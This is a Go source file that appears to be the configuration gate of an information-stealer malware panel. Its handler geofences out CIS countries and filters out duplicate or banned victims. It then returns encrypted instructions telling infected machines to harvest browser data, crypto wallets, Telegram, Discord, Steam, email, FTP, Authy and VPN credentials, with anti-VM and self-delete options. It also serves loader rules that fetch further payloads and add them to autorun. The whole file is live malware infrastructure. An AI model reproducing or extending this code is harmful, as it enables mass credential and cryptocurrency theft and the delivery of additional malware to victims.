package gate

import (
	"fmt"
	"io/ioutil"
	"net/http"

	database "../../db"
	lggr "../../logger"
	utils "../../utils"
	config "../config"
	grabber "../grabber"
	loader "../loader"

	"github.com/gin-gonic/gin"
	"github.com/ip2location/ip2location-go"
)

var db = database.Connect()
var logger = lggr.Log()

func IsLogExist(uid string) bool {
	var logCount int
	err := db.QueryRow("SELECT COUNT(*) AS logCount FROM `logs` WHERE `uid` = ?", uid).Scan(&logCount)

	if err != nil {
		logger.Println("gate.cfg.IsLogExist:", err)
	}

	if logCount == 1 {
		return true
	} else {
		return false
	}
}

type BannedData struct {
	Id   int    `db:"Id"`
	Data string `db:"Data"`
}

func IsLogBanned(uid, ip, country string) bool {
	var bannedData []BannedData
	err := db.Select(&bannedData, "SELECT * FROM `banned`")
	if err != nil {
		logger.Println("gate.cfg.IsLogBanned error: ", err)
	}

	for _, banData := range bannedData {
		if banData.Data == uid || banData.Data == ip || banData.Data == country {
			return true
		}
	}

	return false
}

func BuildConfig() string {
	configData := config.GetConfig()
	return fmt.Sprintf("%d;%d;%d;%d;%d;%d;%d;%d;%d;%d;%d;%d;%d;%d;%d;%d;%d;%d;%d;%d",
		utils.BoolToInt(configData.Chromium),
		utils.BoolToInt(configData.Gecko),
		utils.BoolToInt(configData.Edge),
		utils.BoolToInt(configData.History),
		utils.BoolToInt(configData.SysInfo),
		utils.BoolToInt(configData.Screenshot),
		utils.BoolToInt(configData.CryptoWallets),
		utils.BoolToInt(configData.Steam),
		utils.BoolToInt(configData.Telegram),
		utils.BoolToInt(configData.Discord),
		utils.BoolToInt(configData.Jabber),
		utils.BoolToInt(configData.Foxmail),
		utils.BoolToInt(configData.Outlook),
		utils.BoolToInt(configData.FileZilla),
		utils.BoolToInt(configData.WinScp),
		utils.BoolToInt(configData.Authy),
		utils.BoolToInt(configData.NordVpn),
		configData.MaxFilesSize,
		utils.BoolToInt(configData.AntiVm),
		utils.BoolToInt(configData.SelfDelete),
	)
}

func BuildGrabberConfig() string {
	grabberData := grabber.GetGrabberRules()

	var grabberConfig string
	for _, rule := range grabberData {
		if !rule.Status {
			continue
		}

		grabberConfig += fmt.Sprintf("[%s;%s;%d;%s;%s;%d]|",
			rule.Path,
			rule.Mask,
			rule.FileSize,
			rule.Domains,
			rule.Exeptions,
			utils.BoolToInt(rule.Recursive),
		)
	}

	grabberConfigSize := len(grabberConfig)
	if grabberConfigSize == 0 {
		return ""
	}

	return grabberConfig[0 : grabberConfigSize-1]
}

func GetCountry(ip string) string {
	db, err := ip2location.OpenDB("./db/ip2country.bin")
	if err != nil {
		logger.Println("gate.cfg.GetCountry error: ", err)
		return "UNK"
	}
	defer db.Close()

	results, err := db.Get_all(ip)
	country := results.Country_short

	if country == "-" {
		return "UNK"
	}

	return results.Country_short
}

func BuildLoaderData() string {
	loaderData := loader.GetLoaderRules()

	var loaderConfig string
	for _, rule := range loaderData {
		if !rule.Status {
			continue
		}

		loaderConfig += fmt.Sprintf("[%s;%s;%s;%d;%d;%d]|",
			rule.Link,
			rule.Args,
			rule.Domains,
			utils.BoolToInt(rule.OnlyCrypto),
			utils.BoolToInt(rule.AddAutorun),
			rule.Id,
		)

		_, err := db.Exec("UPDATE `loader` SET `Loads` = `Loads` + 1 WHERE `Id` = ?", rule.Id)
		if err != nil {
			logger.Println("gate.cfg.BuildLoaderData: update loader loads error: ", err)
		}
	}

	loaderConfigSize := len(loaderConfig)
	if loaderConfigSize == 0 {
		return ""
	}

	return loaderConfig[0 : loaderConfigSize-1]
}

func CfgHandler(ctx *gin.Context) {
	body := ctx.Request.Body
	bodyBytes, err := ioutil.ReadAll(body)
	if err != nil {
		logger.Println("gate.cfg.Handler: read request body error: ", err)
		ctx.String(http.StatusOK, utils.EncryptData(utils.GenRandStr(64)))
		return
	}
	defer body.Close()

	uid := utils.DecodeData(string(bodyBytes))
	ip := ctx.ClientIP()
	country := GetCountry(ip)

	if country == "RU" ||
		country == "AM" ||
		country == "BY" ||
		country == "GE" ||
		country == "KZ" ||
		country == "TJ" ||
		country == "UZ" ||
		country == "UA" {
		logger.Println("gate.cfg.Handler: CIS log detected, UID = " + uid + " IP = " + ip + " country = " + country)
		ctx.String(http.StatusOK, utils.EncryptData("fuck off"))
		return
	}

	if IsLogExist(uid) {
		logger.Println("gate.cfg.Handler: duplicate log detected, UID = " + uid)
		ctx.String(http.StatusOK, utils.EncryptData("fuck off"))
		return
	}

	if IsLogBanned(uid, ip, country) {
		logger.Println("gate.cfg.Handler: banned log detected, UID = " + uid + " IP = " + ip + " country = " + country)
		ctx.String(http.StatusOK, utils.EncryptData("fuck off"))
		return
	}

	config := fmt.Sprintf("[%s]#[%s]#[%s;%s]#[%s]",
		BuildConfig(),
		BuildGrabberConfig(),
		ip,
		country,
		BuildLoaderData(),
	)

	ctx.String(http.StatusOK, utils.EncryptData(config))
}
